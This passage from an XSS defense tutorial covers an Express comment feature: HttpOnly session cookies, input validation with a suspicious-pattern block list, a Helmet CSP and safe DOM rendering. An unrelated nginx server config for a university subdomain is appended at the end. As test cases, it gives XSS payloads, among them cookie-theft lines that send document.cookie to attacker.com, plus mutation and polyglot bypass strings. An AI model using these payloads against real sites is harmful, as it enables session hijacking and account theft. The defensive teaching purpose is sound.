<p><strong>Update session config in <code>server.js</code> (Line 23):</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚úÖ SECURE: HttpOnly cookies</span>
app.use(session({
  <span class="hljs-attr">secret</span>: process.env.SESSION_SECRET || <span class="hljs-string">'change-this-in-production'</span>,  <span class="hljs-comment">// Use env variable</span>
  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">cookie</span>: {
    <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,   <span class="hljs-comment">// ‚úÖ JavaScript CANNOT access cookies</span>
    <span class="hljs-attr">secure</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// ‚úÖ Only send over HTTPS</span>
    <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,  <span class="hljs-comment">// ‚úÖ CSRF protection</span>
    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">1</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>  <span class="hljs-comment">// 1 hour (not 24!)</span>
  }
}));
</div></code></pre>
<p><strong>What this prevents:</strong></p>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚ùå This will FAIL if httpOnly: true</span>
fetch(<span class="hljs-string">'https://attacker.com/?cookie='</span> + <span class="hljs-built_in">document</span>.cookie);  <span class="hljs-comment">// Returns empty string</span>
</div></code></pre>
<hr>
<h3 id="layer-5-input-validation-length--type">Layer 5: Input Validation (Length &amp; Type)</h3>
<pre class="hljs"><code><div><span class="hljs-comment">// ‚úÖ SECURE: Validate input length</span>
app.post(<span class="hljs-string">'/api/comments'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> { text } = req.body;
  
  <span class="hljs-keyword">if</span> (!text || <span class="hljs-keyword">typeof</span> text !== <span class="hljs-string">'string'</span>) {
    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Comment text required'</span> });
  }
  
  <span class="hljs-comment">// ‚úÖ Limit length</span>
  <span class="hljs-keyword">if</span> (text.length &gt; <span class="hljs-number">500</span>) {
    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Comment too long (max 500 characters)'</span> });
  }
  
  <span class="hljs-comment">// ‚úÖ Check for suspicious patterns</span>
  <span class="hljs-keyword">const</span> suspiciousPatterns = [
    <span class="hljs-regexp">/&lt;script/i</span>,
    /javascript:<span class="hljs-regexp">/i,
    /</span>on\w+=<span class="hljs-regexp">/i,  /</span><span class="hljs-regexp">/ onclick=, onerror=, etc.
    /</span>&lt;iframe/i,
    /&lt;object/i,
    /&lt;embed/i
  ];
  
  if (suspiciousPatterns.some(pattern =&gt; pattern.test(text))) {
    return res.status(400).json({ error: 'Invalid content detected' });
  }
  
  // ... continue with sanitization
});
</div></code></pre>
<hr>
<h2 id="complete-secure-implementation-example">Complete Secure Implementation Example</h2>
<h3 id="server-side-serverjs">Server-Side (<code>server.js</code>)</h3>
<pre class="hljs"><code><div><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express-session'</span>);
<span class="hljs-keyword">const</span> createDOMPurify = <span class="hljs-built_in">require</span>(<span class="hljs-string">'isomorphic-dompurify'</span>);
<span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">'helmet'</span>);  <span class="hljs-comment">// npm install helmet</span>

<span class="hljs-keyword">const</span> app = express();
<span class="hljs-keyword">const</span> DOMPurify = createDOMPurify();

<span class="hljs-comment">// ‚úÖ Use Helmet for security headers</span>
app.use(helmet({
  <span class="hljs-attr">contentSecurityPolicy</span>: {
    <span class="hljs-attr">directives</span>: {
      <span class="hljs-attr">defaultSrc</span>: [<span class="hljs-string">"'self'"</span>],
      <span class="hljs-attr">scriptSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"https://cdn.jsdelivr.net"</span>],
      <span class="hljs-attr">styleSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"'unsafe-inline'"</span>, <span class="hljs-string">"https://cdn.jsdelivr.net"</span>],
      <span class="hljs-attr">imgSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"data:"</span>, <span class="hljs-string">"https:"</span>],
      <span class="hljs-attr">connectSrc</span>: [<span class="hljs-string">"'self'"</span>, <span class="hljs-string">"https://router.huggingface.co"</span>],
      <span class="hljs-attr">frameAncestors</span>: [<span class="hljs-string">"'none'"</span>],
    },
  },
}));

<span class="hljs-comment">// ‚úÖ Secure session</span>
app.use(session({
  <span class="hljs-attr">secret</span>: process.env.SESSION_SECRET,
  <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">cookie</span>: {
    <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">secure</span>: process.env.NODE_ENV === <span class="hljs-string">'production'</span>,
    <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'strict'</span>,
    <span class="hljs-attr">maxAge</span>: <span class="hljs-number">3600000</span>  <span class="hljs-comment">// 1 hour</span>
  }
}));

<span class="hljs-comment">// ‚úÖ Secure comment endpoint</span>
app.post(<span class="hljs-string">'/api/comments'</span>, (req, res) =&gt; {
  <span class="hljs-keyword">const</span> { text } = req.body;
  
  <span class="hljs-comment">// Authentication check</span>
  <span class="hljs-keyword">if</span> (!req.session.userId) {
    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">401</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Authentication required'</span> });
  }
  
  <span class="hljs-comment">// Validation</span>
  <span class="hljs-keyword">if</span> (!text || <span class="hljs-keyword">typeof</span> text !== <span class="hljs-string">'string'</span> || text.length &gt; <span class="hljs-number">500</span>) {
    <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).json({ <span class="hljs-attr">error</span>: <span class="hljs-string">'Invalid comment'</span> });
  }
  
  <span class="hljs-comment">// Sanitization - remove ALL HTML</span>
  <span class="hljs-keyword">const</span> sanitizedText = DOMPurify.sanitize(text, {
    <span class="hljs-attr">ALLOWED_TAGS</span>: [],
    <span class="hljs-attr">ALLOWED_ATTR</span>: []
  });
  
  <span class="hljs-keyword">const</span> comment = {
    <span class="hljs-attr">id</span>: commentIdCounter++,
    <span class="hljs-attr">username</span>: req.session.username,
    <span class="hljs-attr">text</span>: sanitizedText,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">Date</span>.now()
  };
  
  mockDB.comments.push(comment);
  res.json({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, comment });
});
</div></code></pre>
<h3 id="client-side-commentsjs">Client-Side (<code>comments.js</code>)</h3>
<pre class="hljs"><code><div><span class="hljs-comment">// Load comments with safe rendering</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadComments</span>(<span class="hljs-params"></span>) </span>{
  fetch(<span class="hljs-string">'/api/comments'</span>)
    .then(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.json())
    .then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> container = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'commentsContainer'</span>);
      
      <span class="hljs-keyword">if</span> (!data.comments || data.comments.length === <span class="hljs-number">0</span>) {
        container.innerHTML = <span class="hljs-string">'&lt;div class="text-center text-muted"&gt;&lt;p&gt;No comments yet.&lt;/p&gt;&lt;/div&gt;'</span>;
        <span class="hljs-keyword">return</span>;
      }
      
      container.innerHTML = <span class="hljs-string">''</span>;
      
      data.comments.forEach(<span class="hljs-function"><span class="hljs-params">comment</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> commentDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
        commentDiv.className = <span class="hljs-string">'comment-item'</span>;
        
        <span class="hljs-comment">// ‚úÖ SECURE: Create elements safely</span>
        <span class="hljs-keyword">const</span> header = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
        header.className = <span class="hljs-string">'comment-header'</span>;
        
        <span class="hljs-keyword">const</span> username = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'span'</span>);
        username.className = <span class="hljs-string">'username'</span>;
        username.textContent = comment.username;  <span class="hljs-comment">// ‚úÖ Safe</span>
        
        <span class="hljs-keyword">const</span> timestamp = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'span'</span>);
        timestamp.className = <span class="hljs-string">'timestamp'</span>;
        timestamp.textContent = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Date</span>(comment.timestamp).toLocaleString();
        
        header.appendChild(username);
        header.appendChild(timestamp);
        
        <span class="hljs-keyword">const</span> textDiv = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'div'</span>);
        textDiv.className = <span class="hljs-string">'comment-text'</span>;
        textDiv.textContent = comment.text;  <span class="hljs-comment">// ‚úÖ Safe - no HTML execution</span>
        
        <span class="hljs-keyword">const</span> deleteBtn = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'button'</span>);
        deleteBtn.className = <span class="hljs-string">'btn btn-sm btn-danger'</span>;
        deleteBtn.textContent = <span class="hljs-string">'Delete'</span>;
        deleteBtn.onclick = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> deleteComment(comment.id);  <span class="hljs-comment">// ‚úÖ Safe - JS function, not string</span>
        
        commentDiv.appendChild(header);
        commentDiv.appendChild(textDiv);
        commentDiv.appendChild(deleteBtn);
        
        container.appendChild(commentDiv);
      });
    });
}
</div></code></pre>
<hr>
<h2 id="quick-reference-safe-vs-unsafe">Quick Reference: Safe vs Unsafe</h2>
<table>
<thead>
<tr>
<th>‚ùå Unsafe</th>
<th>‚úÖ Safe</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>element.innerHTML = userInput</code></td>
<td><code>element.textContent = userInput</code></td>
<td>textContent escapes HTML</td>
</tr>
<tr>
<td><code>element.innerHTML = data</code></td>
<td><code>element.innerHTML = DOMPurify.sanitize(data)</code></td>
<td>DOMPurify removes scripts</td>
</tr>
<tr>
<td>No input validation</td>
<td>Length + type + pattern checks</td>
<td>Defense in depth</td>
</tr>
<tr>
<td><code>httpOnly: false</code></td>
<td><code>httpOnly: true</code></td>
<td>Prevents cookie theft</td>
</tr>
<tr>
<td>No CSP headers</td>
<td>CSP with strict policy</td>
<td>Blocks inline scripts</td>
</tr>
<tr>
<td>Store raw user input</td>
<td>Sanitize before storing</td>
<td>Prevent stored XSS</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="testing-your-defenses">Testing Your Defenses</h2>
<h3 id="test-1-basic-xss">Test 1: Basic XSS</h3>
<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'XSS'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</div></code></pre>
<p><strong>Expected:</strong> Should be escaped or blocked</p>
<h3 id="test-2-event-handler-xss">Test 2: Event Handler XSS</h3>
<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">XSS</span>')&gt;</span>
</div></code></pre>
<p><strong>Expected:</strong> Should be blocked by CSP or sanitized</p>
<h3 id="test-3-cookie-theft">Test 3: Cookie Theft</h3>
<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"fetch('https://attacker.com/?c='+document.cookie)"</span>&gt;</span>
</div></code></pre>
<p><strong>Expected:</strong> httpOnly cookies return empty string</p>
<h3 id="test-4-dom-clobbering">Test 4: DOM Clobbering</h3>
<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">userInput</span>&gt;</span>
</div></code></pre>
<p><strong>Expected:</strong> Should be sanitized</p>
<hr>
<h2 id="red-team-bypass-attempts-for-educational-testing">Red Team Bypass Attempts (For Educational Testing)</h2>
<p>Even with defenses, attackers try:</p>
<ol>
<li><strong>Encoding bypasses:</strong> <code>%3Cscript%3E</code>, <code>&amp;#60;script&amp;#62;</code></li>
<li><strong>Mutation XSS:</strong> <code>&lt;noscript&gt;&lt;p title=&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;&gt;</code></li>
<li><strong>CSP bypasses:</strong> Using whitelisted CDNs for malicious scripts</li>
<li><strong>Polyglot payloads:</strong> <code>jaVasCript:/*-/*</code>/<em>`/</em>'/<em>&quot;/**/(/</em> */onerror=alert('XSS') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('XSS')//&gt;\x3e`</li>
</ol>
<p><strong>Your defenses should block all of these!</strong></p>
<pre class="hljs"><code><div><span class="hljs-section">server</span> {
    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;
    <span class="hljs-attribute">server_name</span> project-<span class="hljs-number">1</span>-<span class="hljs-number">04</span>.eduhk.hk;
    <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://<span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;
}

<span class="hljs-section">server</span> {
    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;
    <span class="hljs-attribute">server_name</span> project-<span class="hljs-number">1</span>-<span class="hljs-number">04</span>.eduhk.hk;
    <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl/dept-wildcard.eduhk/fullchain.crt;
    <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl/dept-wildcard.eduhk/dept-wildcard.eduhk.hk.key;
    <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;
    <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;
    <span class="hljs-attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;
    <span class="hljs-attribute">ssl_stapling</span> <span class="hljs-literal">on</span>;
    <span class="hljs-attribute">ssl_stapling_verify</span> <span class="hljs-literal">on</span>;
    <span class="hljs-attribute">resolver</span> <span class="hljs-number">8.8.8.8</span> <span class="hljs-number">8.8.4.4</span> valid=<span class="hljs-number">300s</span>;
    <span class="hljs-attribute">ssl_trusted_certificate</span> /etc/nginx/ssl/dept-wildcard.eduhk/fullchain.crt;

    <span class="hljs-attribute">client_max_body_size</span> <span class="hljs-number">100M</span>;

<span class="hljs-attribute">location</span> /langgraphplayground/ {
    <span class="hljs-comment"># Don't use rewrite! Let FastAPI handle the full path</span>
    <span class="hljs-attribute">proxy_pass</span> http://localhost:2024;
    <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;
    <span class="hljs-attribute">proxy_set_header</span> Upgrade <span class="hljs-variable">$http_upgrade</span>;
    <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-variable">$connection_upgrade</span>;
    <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
    <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
    <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;
    <span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">off</span>;
    <span class="hljs-attribute">proxy_cache</span> <span class="hljs-literal">off</span>;
    <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">300s</span>;
    <span class="hljs-attribute">proxy_connect_timeout</span> <span class="hljs-number">75s</span>;
}


<span class="hljs-attribute">location</span> /mcp/ {
        <span class="hljs-comment"># Proxy to Docker container on localhost:8080</span>
        <span class="hljs-attribute">proxy_pass</span> http://localhost:8080/mcp/;

        <span class="hljs-comment"># Essential for SSE (Server-Sent Events)</span>
        <span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">off</span>;           <span class="hljs-comment"># CRITICAL: Must disable buffering for SSE</span>
        <span class="hljs-attribute">proxy_cache</span> <span class="hljs-literal">off</span>;               <span class="hljs-comment"># Disable caching for real-time streams</span>

        <span class="hljs-comment"># Connection headers</span>
        <span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
        <span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
        <span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;

        <span class="hljs-comment"># SSE-specific headers</span>
        <span class="hljs-attribute">proxy_set_header</span> Connection <span class="hljs-string">''</span>;  <span class="hljs-comment"># Keep connection open</span>
        <span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;          <span class="hljs-comment"># Required for SSE</span>

        <span class="hljs-comment"># Timeouts for long-lived connections</span>
        <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">86400s</span>;       <span class="hljs-comment"># 24 hours</span>
        <span class="hljs-attribute">proxy_send_timeout</span> <span class="hljs-number">86400s</span>;       <span class="hljs-comment"># 24 hours</span>

        <span class="hljs-comment"># Disable compression for SSE</span>
        <span class="hljs-attribute">gzip</span> <span class="hljs-literal">off</span>;

        <span class="hljs-comment"># CORS headers (if Inspector is accessed from different domain)</span>
        <span class="hljs-attribute">add_header</span> <span class="hljs-string">'Access-Control-Allow-Origin'</span> <span class="hljs-string">'*'</span> always;
        <span class="hljs-attribute">add_header</span> <span class="hljs-string">'Access-Control-Allow-Methods'</span> <span class="hljs-string">'GET, POST, OPTIONS'</span> always;
        <span class="hljs-attribute">add_header</span> <span class="hljs-string">'Access-Control-Allow-Headers'</span> <span class="hljs-string">'Content-Type, Accept'</span> always;

        <span class="hljs-comment"># Handle OPTIONS preflight requests</span>
        <span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_method</span> = <span class="hljs-string">'OPTIONS'</span>) {
            <span class="hljs-attribute">return</span> <span class="hljs-number">204</span>;
        }
    }



<span class="hljs-attribute">location</span> / {
<span class="hljs-attribute">proxy_pass</span> http://localhost:3000;
<span class="hljs-attribute">proxy_set_header</span> Host <span class="hljs-variable">$host</span>;
<span class="hljs-attribute">proxy_set_header</span> X-Real-IP <span class="hljs-variable">$remote_addr</span>;
<span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
<span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;
<span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>; <span class="hljs-comment"># ‚úì HTTP/1.1 (good for SSE)</span>
 <span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">off</span>; <span class="hljs-comment"># ‚úì if you want streams immediately</span>
 <span class="hljs-attribute">proxy_cache</span> <span class="hljs-literal">off</span>; <span class="hljs-comment"># ‚úì No caching</span>
 <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">300s</span>; <span class="hljs-comment"># ‚úì Long timeout for persistent</span>
}
}

</div></code></pre>

</body>
</html>
